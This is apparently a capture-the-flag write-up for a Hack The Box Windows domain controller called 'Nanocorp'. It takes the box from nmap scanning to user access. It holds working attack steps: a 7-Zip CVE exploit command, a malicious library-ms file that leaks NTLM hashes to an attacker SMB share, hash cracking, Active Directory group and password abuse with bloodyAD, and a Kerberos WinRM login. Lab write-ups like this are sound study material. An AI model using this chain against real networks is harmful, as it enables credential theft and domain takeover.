# Nanocorp
- Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb)

## NMAP
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://nanocorp.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-11 04:41:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn:
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Issuer: commonName=dc01.nanocorp.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-06T22:58:43
| Not valid after:  2026-04-06T23:18:43
| MD5:   2e3e1a1010b87f43dc93a4d905ef6053
|_SHA-1: 4674631227cee78391b7ec001746f114d6694ea0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
54305/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54316/tcp open  msrpc         Microsoft Windows RPC
54324/tcp open  msrpc         Microsoft Windows RPC
54348/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## FOOTHOLD
- found `hire.nanocorp.htb` to upload zip/rar/7z files.
```
Warning: mime_content_type(C:\xampp\tmp\phpE6A9.tmp): Failed to open stream: Invalid argument in C:\xampp\htdocs\hire\upload.php on line 27
Invalid file type. Only ZIP, 7Z, and RAR files are allowed.
```
- directory/file brute showed - `upload.php, success.php`
- vhost - nothing new
- Trying https://github.com/pacbypass/CVE-2025-11001 - https://pacbypass.github.io/2025/10/16/diffing-7zip-for-cve-2025-11001.html
    - python3 exploit.py -t "C:\xampp\htdocs\hire\getter.php" -o demo.zip --data-file "C:\xampp\tmp\php4348.tmp"
- `hashgrab on the library-ms file`
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\10.10.14.14\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>

```
- `zip resume.zip resume.library-ms`
- start responder and upload the zip file
- check hashes captured on responder
```
[SMB] NTLMv2-SSP Client   : 10.10.11.93
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:ae9ecc624e5d1f80:796D8A8F33E5D2170C86A681027CD1A0:0101000000000000006ABA935753DC0148298D772EB46C5400000000020008004B004E004A00440001001E00570049004E002D003700330042004D004800430034004600380030004E0004003400570049004E002D003700330042004D004800430034004600380030004E002E004B004E004A0044002E004C004F00430041004C00030014004B004E004A0044002E004C004F00430041004C00050014004B004E004A0044002E004C004F00430041004C0007000800006ABA935753DC01060004000200000008003000300000000000000000000000002000006AF71A2BF5F834F94C6CEBBFB9522397E89C2FCBF4048B40C7A6B2F56B74142E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310034000000000000000000
```
- `hashcat -m 5600 web.hash rockyou.txt`
    - `web_svc:dksehdgh712!@#`
```
nxc smb 10.10.11.93 -u web_svc -p 'dksehdgh712!@#' --users
SMB         10.10.11.93     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.93     445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@#
SMB         10.10.11.93     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.11.93     445    DC01             Administrator                 2025-04-09 23:00:49 0       Built-in account for administering the computer/domain
SMB         10.10.11.93     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.11.93     445    DC01             krbtgt                        2025-04-03 01:38:45 0       Key Distribution Center Service Account
SMB         10.10.11.93     445    DC01             web_svc                       2025-04-09 22:59:38 0
SMB         10.10.11.93     445    DC01             monitoring_svc                2025-11-12 10:23:55 0
```

- ![alt text](/docs/blog/attachments/nanocorp.png)
- `bloodyAD -d nanocorp.htb --dc-ip 10.10.11.93 -u web_svc -p 'dksehdgh712!@#' add groupMember "IT_SUPPORT" "web_svc"`
    - `[+] web_svc added to IT_SUPPORT`

- `net rpc password "monitoring_svc" -U nanocorp.htb/web_svc -S "10.10.11.93"`

```
rpcclient -U $DOMAIN/$ControlledUser $DomainController
rpcclient $> setuserinfo2 $TargetUser 23 $NewPassword
```

- `bloodyAD --host 10.10.11.93 -d "nanocorp.htb" -u "web_svc" -p 'dksehdgh712!@#' set password "monitoring_svc" 'dksehdgh712!@#'`

- using Kerberos authentication
- `impacket-getTGT nanocorp.htb/monitoring_svc:'dksehdgh712!@#' -dc-ip 10.10.11.93`
- `export KRB5CCNAME=/home/kali/hack/HTB/machines/windows/nanocorp/monitoring_svc.ccache`
- `python3 winrmexec.py -ssl -port 5986 -k nanocorp.htb/monitoring_svc@dc01.nanocorp.htb -no-pass -target-ip 10.10.11.93`
    - get user.txt `7343cf957c40ce9095a32ac71edb1725`

## PRIVESC
